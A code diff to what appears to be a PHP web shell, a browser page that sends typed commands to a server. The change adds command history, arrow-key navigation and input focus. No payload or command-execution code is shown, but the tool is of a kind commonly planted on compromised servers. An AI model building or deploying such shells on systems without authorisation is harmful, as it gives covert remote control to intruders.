@@ -118,9 +118,12 @@ if (isset($_GET["feature"])) {
 
         <script>
             var CWD = null;
+            var commandHistory = [];
+            var historyPosition = 0;
+            var eShellCmdInput = null;
+            var eShellContent = null;
 
             function featureShell(command) {
-                var eShellContent = document.getElementById("shell-content");
 
                 function _insertCommand(command) {
                     eShellContent.innerHTML += "\n\n";
@@ -178,11 +181,39 @@ if (isset($_GET["feature"])) {
             }
 
             function _onShellCmdKeyDown(event) {
-                var eShellCmdInput = document.getElementById("shell-cmd");
-                if (event.key === "Enter") {
-                    featureShell(eShellCmdInput.value);
-                    eShellCmdInput.value = "";
+                switch (event.key) {
+                    case 'Enter':
+                        featureShell(eShellCmdInput.value);
+                        insertToHistory(eShellCmdInput.value);
+                        eShellCmdInput.value = "";
+                        break;
+                    case 'ArrowUp':
+                        if (historyPosition > 0) {
+                            historyPosition--;
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
+                    case 'ArrowDown':
+                        if (historyPosition >= commandHistory.length) {
+                            break;
+                        }
+                        historyPosition++;
+                        if (historyPosition === commandHistory.length) {
+                            eShellCmdInput.value = "";
+                        } else {
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
                 }
+            }
+
+            function insertToHistory(cmd) {
+                commandHistory.push(cmd);
+                historyPosition = commandHistory.length;
             }
 
             function makeRequest(url, params, callback) {
@@ -212,7 +243,10 @@ if (isset($_GET["feature"])) {
             }
 
             window.onload = function() {
+                eShellCmdInput = document.getElementById("shell-cmd");
+                eShellContent = document.getElementById("shell-content");
                 updateCwd();
+                eShellCmdInput.focus();
             };
         </script>
     </head>
